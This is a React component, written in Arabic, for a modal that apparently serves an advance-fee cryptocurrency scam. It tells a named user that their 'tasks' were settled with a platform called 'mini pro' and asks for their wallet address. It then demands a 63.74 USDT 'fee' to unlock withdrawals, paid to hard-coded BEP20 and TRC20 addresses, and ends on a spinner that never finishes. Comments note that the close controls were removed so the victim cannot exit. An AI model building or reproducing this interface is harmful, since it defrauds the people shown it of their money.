
import React, { useState } from 'react';
import { X, CheckCircle2, Wallet, Info, Copy, Clock } from 'lucide-react';

interface ActionModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
  const [step, setStep] = useState(1);
  const [walletAddress, setWalletAddress] = useState('');

  if (!isOpen) return null;

  const handleNext = () => setStep(step + 1);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('تم نسخ العنوان');
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center px-6">
      {/* Backdrop - Removed onClick to prevent closing */}
      <div 
        className="absolute inset-0 bg-black/30 backdrop-blur-sm transition-opacity"
      ></div>

      {/* Modal Content */}
      <div className="bg-white w-full max-w-[350px] rounded-[28px] overflow-hidden shadow-2xl relative animate-in fade-in zoom-in duration-300" dir="rtl">
        
        {/* Header Spacer - Close button removed to prevent exit */}
        <div className="p-6 pb-2"></div>

        <div className="p-6 pt-0">
          {step === 1 && (
            <div className="text-center">
              <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
                <Info className="text-blue-500" size={32} />
              </div>
              <h3 className="text-lg font-bold text-gray-800 mb-4">أهلاً بك gHKA616</h3>
              <p className="text-gray-600 text-sm leading-relaxed mb-8">
                تم حل أمر المهام ضمن اتفاق برتكول بين منصتنا ومنصه <span className="font-bold text-blue-600">mini pro</span>. يرجى المتابعة لإتمام الإجراءات.
              </p>
              <button 
                onClick={handleNext}
                className="w-full py-3.5 bg-[#9B4A4E] text-white rounded-xl font-bold shadow-lg shadow-red-900/20 active:scale-[0.98] transition-all"
              >
                التالي
              </button>
            </div>
          )}

          {step === 2 && (
            <div className="text-center">
              <div className="w-16 h-16 bg-amber-50 rounded-full flex items-center justify-center mx-auto mb-4">
                <Wallet className="text-amber-500" size={32} />
              </div>
              <h3 className="text-lg font-bold text-gray-800 mb-4">إعداد السحب</h3>
              <p className="text-gray-600 text-sm mb-6">يرجى وضع رابط محفظتك الخاصة التي ترغب باستلام الأرباح عليها:</p>
              <input 
                type="text" 
                placeholder="أدخل عنوان المحفظة هنا..."
                className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl mb-8 focus:outline-none focus:border-[#9B4A4E] text-left"
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
              />
              <button 
                onClick={handleNext}
                disabled={!walletAddress}
                className={`w-full py-3.5 ${walletAddress ? 'bg-[#9B4A4E]' : 'bg-gray-300'} text-white rounded-xl font-bold shadow-lg active:scale-[0.98] transition-all`}
              >
                التالي
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="text-right">
              <h3 className="text-lg font-bold text-gray-800 mb-3">تفعيل قناة السحب</h3>
              <p className="text-gray-600 text-[13px] leading-relaxed mb-4">
                أهلاً بك <span className="font-bold text-gray-800">gHKA616</span>، بقي أمر إيداع مبلغ <span className="text-red-600 font-bold">63.74 USDT</span> لفتح قناة السحب.
              </p>
              <div className="bg-blue-50 p-3 rounded-lg mb-4">
                <p className="text-[11px] text-blue-700 leading-tight">
                  هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه mini pro.
                </p>
              </div>
              
              <div className="space-y-3 mb-6">
                <div className="p-3 bg-gray-50 rounded-xl border border-gray-100">
                  <p className="text-[11px] text-gray-500 mb-1">USDT (BEP20)</p>
                  <div className="flex items-center justify-between gap-2">
                    <code className="text-[10px] break-all text-gray-700">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
                    <button onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="text-[#9B4A4E]">
                      <Copy size={16} />
                    </button>
                  </div>
                </div>

                <div className="p-3 bg-gray-50 rounded-xl border border-gray-100">
                  <p className="text-[11px] text-gray-500 mb-1">USDT (TRC20)</p>
                  <div className="flex items-center justify-between gap-2">
                    <code className="text-[10px] break-all text-gray-700">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</code>
                    <button onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')} className="text-[#9B4A4E]">
                      <Copy size={16} />
                    </button>
                  </div>
                </div>
              </div>

              <button 
                onClick={handleNext}
                className="w-full py-3.5 bg-[#1B5EBE] text-white rounded-xl font-bold shadow-lg active:scale-[0.98] transition-all"
              >
                تم الايداع
              </button>
            </div>
          )}

          {step === 4 && (
            <div className="text-center py-4">
              <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
                <Clock className="text-green-500" size={32} />
              </div>
              <h3 className="text-xl font-bold text-gray-800 mb-4">قيد المراجعة</h3>
              <p className="text-gray-600 text-sm leading-relaxed mb-8">
                الرجاء الانتظار للتأكد من عمليه الايداع. سيتم تحديث حالة حسابك فور التأكيد.
              </p>
              <div className="w-full bg-gray-100 h-2 rounded-full overflow-hidden">
                <div className="bg-green-500 h-full w-1/3 animate-[progress_2s_ease-in-out_infinite]"></div>
              </div>
            </div>
          )}
        </div>
      </div>
      <style>{`
        @keyframes progress {
          0% { transform: translateX(100%); }
          100% { transform: translateX(-100%); }
        }
      `}</style>
    </div>
  );
};

export default ActionModal;